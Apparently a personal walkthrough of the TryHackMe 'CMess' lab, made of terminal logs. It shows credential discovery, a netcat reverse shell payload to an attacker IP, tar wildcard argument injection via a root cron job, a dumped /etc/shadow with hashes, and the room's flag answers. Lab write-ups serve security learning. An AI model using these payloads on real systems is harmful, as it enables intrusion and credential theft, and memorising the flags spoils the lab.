/var/www/html/src/core/widgets/category-post/category-post.php
/var/www/html/src/core/widgets/category-post/style.css
/var/www/html/src/core/widgets/category-post/widget.php
/var/www/html/src/core/widgets/contact-form
/var/www/html/src/core/widgets/contact-form/contact-form.php
/var/www/html/src/core/widgets/contact-form/widget.php
/var/www/html/src/core/widgets/features
/var/www/html/src/core/widgets/features/features.php
/var/www/html/src/core/widgets/features/widget.php
/var/www/html/src/core/widgets/gallery
/var/www/html/src/core/widgets/gallery/gallery.php
/var/www/html/src/core/widgets/gallery/widget.php
/var/www/html/src/core/widgets/image
/var/www/html/src/core/widgets/image/image.php
/var/www/html/src/core/widgets/image/widget.php
/var/www/html/src/core/widgets/latest-post
/var/www/html/src/core/widgets/latest-post/latest-post.php
/var/www/html/src/core/widgets/latest-post/widget.php
/var/www/html/src/core/widgets/links
/var/www/html/src/core/widgets/links/links.php
/var/www/html/src/core/widgets/links/widget.php
/var/www/html/src/core/widgets/paragraph
/var/www/html/src/core/widgets/paragraph/paragraph.php
/var/www/html/src/core/widgets/paragraph/widget.php
/var/www/html/src/core/widgets/post-categories
/var/www/html/src/core/widgets/post-categories/post-categories.php
/var/www/html/src/core/widgets/post-categories/widget.php
/var/www/html/src/core/widgets/social-icons
/var/www/html/src/core/widgets/social-icons/social-icons.php
/var/www/html/src/core/widgets/social-icons/widget.php
/var/www/html/src/core/widgets/tag
/var/www/html/src/core/widgets/tag/tag.php
/var/www/html/src/core/widgets/tag/widget.php
/var/www/html/src/core/widgets/text
/var/www/html/src/core/widgets/text/text.php
/var/www/html/src/core/widgets/text/widget.php
/var/www/html/src/featured_grid
/var/www/html/src/featured_grid/assets
/var/www/html/src/featured_grid/assets/style.css
/var/www/html/src/featured_grid/load.php
/var/www/html/src/featured_grid/package.json
/var/www/html/src/ganalytics
/var/www/html/src/ganalytics/load.php
/var/www/html/src/ganalytics/package.json
/var/www/html/src/gila_fb_comments
/var/www/html/src/gila_fb_comments/load.php
/var/www/html/src/gila_fb_comments/package.json
/var/www/html/src/reCAPTCHA
/var/www/html/src/reCAPTCHA/load.php
/var/www/html/src/reCAPTCHA/package.json
/var/www/html/themes
/var/www/html/themes/.htaccess
/var/www/html/themes/gila-blog
/var/www/html/themes/gila-blog/LICENSE
/var/www/html/themes/gila-blog/blocks-display-head.php
/var/www/html/themes/gila-blog/blog-category.php
/var/www/html/themes/gila-blog/blog-list.php
/var/www/html/themes/gila-blog/blog-tag.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/themes/gila-mag
/var/www/html/themes/gila-mag/LICENSE
/var/www/html/themes/gila-mag/blocks-display-head.php
/var/www/html/themes/gila-mag/blog-list.php
/var/www/html/themes/gila-mag/blog-tag.php
/var/www/html/themes/gila-mag/footer.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/tmp
/var/www/html/tmp/.htaccess

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
  Group www-data:
/tmp/linpeas.sh

╔══════════╣ Searching passwords in config PHP files

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/opt/.password.bak
/usr/lib/grub/i386-pc/legacy_password_test.mod
/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/mysql/plugin/validate_password.so
/usr/share/help-langpack/en_AU/ubuntu-help/user-changepassword.page
/usr/share/help-langpack/en_AU/ubuntu-help/user-forgottenpassword.page
/usr/share/help-langpack/en_AU/ubuntu-help/user-goodpassword.page
/usr/share/help-langpack/en_CA/ubuntu-help/user-changepassword.page
/usr/share/help-langpack/en_CA/ubuntu-help/user-forgottenpassword.page
/usr/share/help-langpack/en_CA/ubuntu-help/user-goodpassword.page
/usr/share/help-langpack/en_GB/evince/password.page
/usr/share/help-langpack/en_GB/ubuntu-help/user-changepassword.page
/usr/share/help-langpack/en_GB/ubuntu-help/user-forgottenpassword.page
/usr/share/help-langpack/en_GB/ubuntu-help/user-goodpassword.page
/usr/share/help-langpack/en_GB/zenity/password.page
/usr/share/icons/Adwaita/scalable/status/dialog-password-symbolic.svg
/usr/share/icons/Humanity/apps/24/password.png
/usr/share/icons/Humanity/apps/48/password.svg
/usr/share/icons/Humanity/status/16/dialog-password.png
/usr/share/icons/Humanity/status/24/dialog-password.png
/usr/share/icons/Humanity/status/48/dialog-password.svg
/usr/share/locale-langpack/en_AU/LC_MESSAGES/credentials-control-center.mo
/usr/share/locale-langpack/en_AU/LC_MESSAGES/ubuntuone-credentials.mo
/usr/share/locale-langpack/en_CA/LC_MESSAGES/credentials-control-center.mo
/usr/share/locale-langpack/en_GB/LC_MESSAGES/credentials-control-center.mo
/usr/share/locale-langpack/en_GB/LC_MESSAGES/ubuntuone-credentials.mo
/usr/share/man/man1/systemd-ask-password.1.gz
/usr/share/man/man1/systemd-tty-ask-password-agent.1.gz
/usr/share/man/man7/credentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/pam/password
/var/www/html/src/core/views/login-change-password.php

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Searching passwords inside logs (limit 70)
 base-passwd depends on libc6 (>= 2.8); however:
 base-passwd depends on libdebconfclient0 (>= 0.145); however:
2019-02-26 23:58:11 configure base-passwd:amd64 3.5.39 3.5.39
2019-02-26 23:58:11 install base-passwd:amd64 <none> 3.5.39
2019-02-26 23:58:11 status half-configured base-passwd:amd64 3.5.39
2019-02-26 23:58:11 status half-installed base-passwd:amd64 3.5.39
2019-02-26 23:58:11 status installed base-passwd:amd64 3.5.39
2019-02-26 23:58:11 status unpacked base-passwd:amd64 3.5.39
2019-02-26 23:58:13 status half-configured base-passwd:amd64 3.5.39
2019-02-26 23:58:13 status half-installed base-passwd:amd64 3.5.39
2019-02-26 23:58:13 status unpacked base-passwd:amd64 3.5.39
2019-02-26 23:58:13 upgrade base-passwd:amd64 3.5.39 3.5.39
2019-02-26 23:58:19 install passwd:amd64 <none> 1:4.2-3.1ubuntu5
2019-02-26 23:58:19 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
2019-02-26 23:58:19 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
2019-02-26 23:58:22 configure base-passwd:amd64 3.5.39 <none>
2019-02-26 23:58:22 status half-configured base-passwd:amd64 3.5.39
2019-02-26 23:58:22 status installed base-passwd:amd64 3.5.39
2019-02-26 23:58:22 status unpacked base-passwd:amd64 3.5.39
2019-02-26 23:58:28 configure passwd:amd64 1:4.2-3.1ubuntu5 <none>
2019-02-26 23:58:28 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
2019-02-26 23:58:28 status installed passwd:amd64 1:4.2-3.1ubuntu5
2019-02-26 23:58:28 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
2019-02-26 23:59:08 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
2019-02-26 23:59:08 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
2019-02-26 23:59:08 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
2019-02-26 23:59:08 status unpacked passwd:amd64 1:4.2-3.1ubuntu5.3
2019-02-26 23:59:08 upgrade passwd:amd64 1:4.2-3.1ubuntu5 1:4.2-3.1ubuntu5.3
2019-02-26 23:59:09 configure passwd:amd64 1:4.2-3.1ubuntu5.3 <none>
2019-02-26 23:59:09 status half-configured passwd:amd64 1:4.2-3.1ubuntu5.3
2019-02-26 23:59:09 status installed passwd:amd64 1:4.2-3.1ubuntu5.3
2019-02-26 23:59:09 status unpacked passwd:amd64 1:4.2-3.1ubuntu5.3
Description: Set up users and passwords
Preparing to unpack .../base-passwd_3.5.39_amd64.deb ...
Preparing to unpack .../passwd_1%3a4.2-3.1ubuntu5_amd64.deb ...
Selecting previously unselected package base-passwd.
Selecting previously unselected package passwd.
Setting up base-passwd (3.5.39) ...
Setting up passwd (1:4.2-3.1ubuntu5) ...
Shadow passwords are now on.
Unpacking base-passwd (3.5.39) ...
Unpacking base-passwd (3.5.39) over (3.5.39) ...
Unpacking passwd (1:4.2-3.1ubuntu5) ...
dpkg: base-passwd: dependency problems, but configuring anyway as you requested:



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
                                ╚════════════════╝
Regexes to search for API keys aren't activated, use param '-r' 


╔══════════╣ Executable files potentially added by user (limit 70)
2020-02-06+18:54:07.1196134090 /opt/.password.bak

www-data@cmess:/tmp$ tar -xzf andre_backup.tar.gz

www-data@cmess:/tmp$ cat note
cat note
Note to self.
Anything in here will be backed up! 

www-data@cmess:/opt$ ls -lah
ls -lah
total 12K
drwxr-xr-x  2 root root 4.0K Feb  6  2020 .
drwxr-xr-x 22 root root 4.0K Feb  6  2020 ..
-rwxrwxrwx  1 root root   36 Feb  6  2020 .password.bak
www-data@cmess:/opt$ cat .password.bak
cat .password.bak
andres backup password
UQfsdCB7aAP6

www-data@cmess:/home$ su andre
su andre
Password: UQfsdCB7aAP6

andre@cmess:/home$ cd andre
cd andre
andre@cmess:~$ ls
ls
backup  user.txt
andre@cmess:~$ cat user.txt
cat user.txt
thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}

andre@cmess:~$ cd backup
cd backup
andre@cmess:~/backup$ ls
ls
note
andre@cmess:~/backup$ cat note
cat note
Note to self.
Anything in here will be backed up! 
andre@cmess:~/backup$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *

https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/

andre@cmess:~/backup$ sudo -l
sudo -l
[sudo] password for andre: UQfsdCB7aAP6

Sorry, user andre may not run sudo on cmess.

andre@cmess:~/backup$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.19.103 1338 >/tmp/f" > shell.sh
             
andre@cmess:~/backup$ echo ""> "--checkpoint-action=exec=sh shell.sh"

andre@cmess:~/backup$ echo ""> --checkpoint=1

andre@cmess:~/backup$ ls -l
ls -l
total 16
-rw-rw-r-- 1 andre andre  1 Mar 14 10:56 --checkpoint=1
-rw-rw-r-- 1 andre andre  1 Mar 14 10:56 --checkpoint-action=exec=sh shell.sh
-rwxr-x--- 1 andre andre 51 Feb  9  2020 note
-rw-rw-r-- 1 andre andre 74 Mar 14 10:56 shell.sh

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1338 
listening on [any] 1338 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.105.35] 59904
sh: 0: can't access tty; job control turned off
# cd /root
# ls
root.txt
# cat root.txt
thm{9f85b7fdeb2cf96985bf5761a93546a2}
# cat /etc/shadow
root:$6$W.gDTDR8$XXB79ORIcggP9.Cl2HzbUfmdADUCasSD92e4HS2kjw5Y9AsTvFeKKbGfDFycsdXoYOhB7Da9mFPcca5a3DyKG1:18299:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18299:0:99999:7:::
uuidd:*:18299:0:99999:7:::
andre:$6$GeMRsVKt$KEQmO.oV7yzpLOVXjDXG/8M/rbw1bngT/VOoRQSn2saquzhMTMl5J8rstkFQ1QD3/dLFS1yAMqj1kbiQWYvQ8.:18299:0:99999:7:::
mysql:!:18299:0:99999:7:::
sshd:*:18299:0:99999:7:::


using symbolic links

Symbolic links, also known as soft links, are special types of files that point to another file or directory in the filesystem. Unlike hard links, symbolic links can span across different filesystems and can even link to files or directories that do not exist yet. Symbolic links are commonly used to create shortcuts or aliases to files or directories, or to link to shared resources across multiple systems.

For example, if you want to create a symbolic link named "mylink" in the current directory that points to a file named "myfile" in the same directory, you can use the following command:


ln -s myfile mylink

This will create a symbolic link named "mylink" that points to the "myfile" file. You can then use the "mylink" filename to access the "myfile" file.

andre@cmess:~/backup$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *

andre@cmess:~$ mv backup backup_bak
mv backup backup_bak
andre@cmess:~$ ls
ls
backup_bak  user.txt

andre@cmess:~$ ln -s /root/ backup
ln -s /root/ backup
andre@cmess:~$ ls -lah
ls -lah
total 36K
drwxr-x--- 4 andre andre 4.0K Mar 14 11:07 .
drwxr-xr-x 3 root  root  4.0K Feb  6  2020 ..
lrwxrwxrwx 1 andre andre    6 Mar 14 11:07 backup -> /root/
drwxr-x--- 2 andre andre 4.0K Mar 14 10:56 backup_bak
lrwxrwxrwx 1 root  root     9 Feb  6  2020 .bash_history -> /dev/null
-rwxr-x--- 1 andre andre  220 Feb  6  2020 .bash_logout
-rwxr-x--- 1 andre andre 3.7K Feb  6  2020 .bashrc
drwxr-x--- 2 andre andre 4.0K Feb  6  2020 .cache
-rwxr-x--- 1 andre andre  655 Feb  6  2020 .profile
lrwxrwxrwx 1 root  root     9 Feb  6  2020 .sudo_as_admin_successful -> /dev/null
-rwxr-x--- 1 andre andre   38 Feb  6  2020 user.txt
-rwxr-x--- 1 andre andre  635 Feb  9  2020 .viminfo

andre@cmess:~$ cd /tmp
cd /tmp
andre@cmess:/tmp$ tar -xvf andre_backup.tar.gz
tar -xvf andre_backup.tar.gz
root.txt
andre@cmess:/tmp$ cat root.txt
cat root.txt
thm{9f85b7fdeb2cf96985bf5761a93546a2}


```

![[Pasted image 20230314114754.png]]

Compromise this machine and obtain user.txt

Have you tried fuzzing for subdomains?

*thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}*

Escalate your privileges and obtain root.txt

*thm{9f85b7fdeb2cf96985bf5761a93546a2}*

[[Wekor]]